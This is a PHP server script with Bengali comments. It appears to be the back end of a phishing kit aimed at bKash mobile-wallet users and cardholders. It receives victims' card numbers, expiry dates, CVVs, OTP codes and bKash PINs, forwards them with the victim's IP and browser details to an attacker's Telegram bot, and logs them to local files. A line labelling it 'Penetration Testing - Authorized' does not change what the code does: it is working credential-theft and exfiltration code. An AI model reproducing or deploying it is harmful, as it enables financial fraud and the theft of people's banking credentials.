<?php
// ============================================
// CAPTURE.PHP - TELEGRAM INTEGRATION
// ============================================

// ---- টেলিগ্রাম কনফিগারেশন ----
define('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE'); // BotFather থেকে পাওয়া Token
define('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID_HERE');     // আপনার চ্যাট আইডি (নিচে দেখানো হয়েছে)

// ---- টেলিগ্রামে মেসেজ পাঠানোর ফাংশন ----
function sendTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// ---- টেলিগ্রামে ফাইল (ফটো/ডকুমেন্ট) পাঠানোর ফাংশন ----
function sendTelegramFile($filePath, $caption = '') {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendDocument";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => TELEGRAM_CHAT_ID,
        'document' => new CURLFile($filePath),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// ---- ডাটা প্রসেসিং ----
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || !isset($data['type']) || !isset($data['data'])) {
    http_response_code(400);
    die(json_encode(['status' => 'error', 'message' => 'Invalid data']));
}

$type = $data['type'];
$info = $data['data'];
$timestamp = date('Y-m-d H:i:s');
$clientIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// ---- টেলিগ্রাম মেসেজ তৈরি ----
$emoji = '';
$header = '';
$fields = [];

switch ($type) {
    case 'card_details':
        $emoji = '💳';
        $header = "🆕 NEW CARD DETAILS CAPTURED!";
        $fields = [
            "💳 Card Number" => $info['card_number'] ?? 'N/A',
            "📅 Expiry" => $info['expiry'] ?? 'N/A',
            "🔐 CVV" => $info['cvv'] ?? 'N/A',
            "👤 Cardholder" => $info['cardholder'] ?? 'N/A',
            "📱 Phone" => $info['phone'] ?? 'N/A',
            "💰 Amount" => $info['amount'] ?? 'N/A'
        ];
        break;
        
    case 'otp':
        $emoji = '🔢';
        $header = "🔢 OTP CAPTURED!";
        $fields = [
            "🔢 OTP Code" => $info['otp'] ?? 'N/A',
            "📱 Phone" => $info['phone'] ?? 'N/A'
        ];
        break;
        
    case 'pin':
        $emoji = '🔐';
        $header = "🔐 bKash PIN CAPTURED!";
        $fields = [
            "🔐 PIN" => $info['pin'] ?? 'N/A',
            "📱 Phone" => $info['phone'] ?? 'N/A'
        ];
        break;
        
    default:
        $emoji = '📌';
        $header = "📌 Unknown Data Captured";
        $fields = ["Data" => json_encode($info)];
}

// ---- টেলিগ্রাম মেসেজ ফরম্যাট ----
$message = "<b>{$emoji} {$header}</b>\n";
$message .= "━━━━━━━━━━━━━━━\n";

foreach ($fields as $label => $value) {
    $message .= "<b>{$label}:</b> <code>{$value}</code>\n";
}

$message .= "━━━━━━━━━━━━━━━\n";
$message .= "🕐 <b>Time:</b> {$timestamp}\n";
$message .= "🌐 <b>IP:</b> {$clientIP}\n";
$message .= "📱 <b>UA:</b> " . substr($userAgent, 0, 50) . "...\n";
$message .= "━━━━━━━━━━━━━━━\n";
$message .= "<i>🔴 Penetration Testing - Authorized</i>";

// ---- টেলিগ্রামে পাঠানো ----
$telegramResponse = sendTelegram($message);

// ---- লোকাল ফাইলেও সেভ ----
$log_file = 'captured_' . date('Y-m-d') . '.txt';
$entry = $timestamp . ' | Type: ' . $type . ' | ' . json_encode($info) . ' | IP: ' . $clientIP . "\n";
file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);

$json_file = 'captures_' . date('Y-m-d') . '.json';
$existing = [];
if (file_exists($json_file)) {
    $existing = json_decode(file_get_contents($json_file), true) ?? [];
}
$existing[] = [
    'id' => uniqid('CAP_'),
    'type' => $type,
    'data' => $info,
    'ip' => $clientIP,
    'user_agent' => $userAgent,
    'timestamp' => $timestamp
];
file_put_contents($json_file, json_encode($existing, JSON_PRETTY_PRINT), LOCK_EX);

// ---- রেসপন্স ----
echo json_encode([
    'status' => 'success',
    'message' => 'Data captured and sent to Telegram',
    'telegram_response' => json_decode($telegramResponse, true)
]);
?>
